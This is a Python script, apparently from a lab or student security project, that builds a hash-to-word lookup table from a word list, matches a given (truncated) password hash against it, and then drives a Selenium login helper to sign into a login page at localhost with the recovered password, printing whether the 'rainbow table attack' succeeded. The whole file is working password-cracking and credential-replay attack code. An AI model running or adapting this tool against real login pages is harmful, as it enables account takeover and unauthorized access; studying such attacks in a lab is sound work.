import rainbowtables as rt
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from Cyber_Scripts import *
import hashlib
import os

"""
# old code

def create_table(wordlists, path="/rainbow_tables", file_name="rainbow_table", hash_type="sha256"):
    rt.set_directory(path, full_path=False)
    rt.set_filename(file_name)

    rt.create_directory()
    rt.create_file()
    rt.insert_wordlists(wordlists, hash_type, wordlist_encoding="utf-8", display_progress=True, compression=True)


# hashed is the hashed value of the real password
def hash_lookup(hashed, table="rainbow_table"):
    lookup = rt.search(hashed, table, full_path=True, time_took=True, compression=True)
    # false if search failed
    # else tuple plaintext and time took to find
    # plaintext is a password that gives the same hashed value like the original function
    return lookup

"""


def get_table_path():
    # Define the path to the current Python file
    current_file_path = os.path.abspath(__file__)

    # Get the directory containing the current Python file
    current_directory = os.path.dirname(current_file_path)

    # Get the parent directory of the current directory
    parent_directory = os.path.dirname(current_directory)

    # Define the path to the new folder and the new file
    new_folder_path = os.path.join(parent_directory, "rainbow_table")
    new_file_path = os.path.join(new_folder_path, "rainbow_table.txt")

    # Create the new folder
    os.makedirs(new_folder_path, exist_ok=True)
    return new_file_path


def hash_word(word, hash_type):
    # Check if the specified hash_type is valid
    valid_hash_types = {'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3_224', 'sha3_256', 'sha3_384',
                        'sha3_512'}
    if hash_type not in valid_hash_types:
        raise ValueError("Invalid hash type. Supported types: " + ", ".join(valid_hash_types))

    # Create a hash object based on the specified hash_type
    hash_object = hashlib.new(hash_type)

    # Update the hash object with the word's bytes
    hash_object.update(word.encode())

    # Get the hexadecimal digest (the hashed result)
    hashed_word = hash_object.hexdigest()

    return hashed_word


def create_table(words_list=None, hash_type="md5", sub_hash=None):
    word_txt = ""
    word_hash = ""

    new_file_path = get_table_path()

    # write teh words in the word list into the file
    with open(new_file_path, "w") as rt:
        for word in words_list:
            word_hash = hash_word(word, hash_type)[0:sub_hash]
            word_txt = word + ":" + word_hash + "\n"
            rt.write(word_txt)


def hash_lookup(hashed):
    file_path = get_table_path()
    # Open the text file for reading
    with open(file_path, 'r') as text_file:
        for line_number, line in enumerate(text_file, start=1):
            line_vals = line.split(":")
            if hashed == line_vals[1][0:-1]:
                return line_vals[0]
        return False


def execute(login_page_url, user_name, hashed, table="rainbow_table"):
    # table creation should happen prior to execution ??

    # extract relevant username and hashed password from db or from GUI

    # lookup the hash in the table
    # fake_password = hash_lookup(hashed, table)
    fake_password = hash_lookup(hashed)
    if not fake_password:
        print("Match password was not found")
        return False

    # lookup successful -> go through login flow
    # try to log in
    passed = enter_login_input(login_page_url, user_name, fake_password)
    if passed:
        print("rainbow table attack succeed")
    else:
        print("rainbow table attack failed")
    return passed


# create_table(words_list=["a", "zzzzzzzzzzzzzzzzzHg8", "b", "zzzzzzzzzzzzzzzzzzzr"], hash_type="md5", sub_hash=5)
print(execute(login_page_url="http://localhost/site/login.php", user_name="c@c.c", hashed="fd391"))
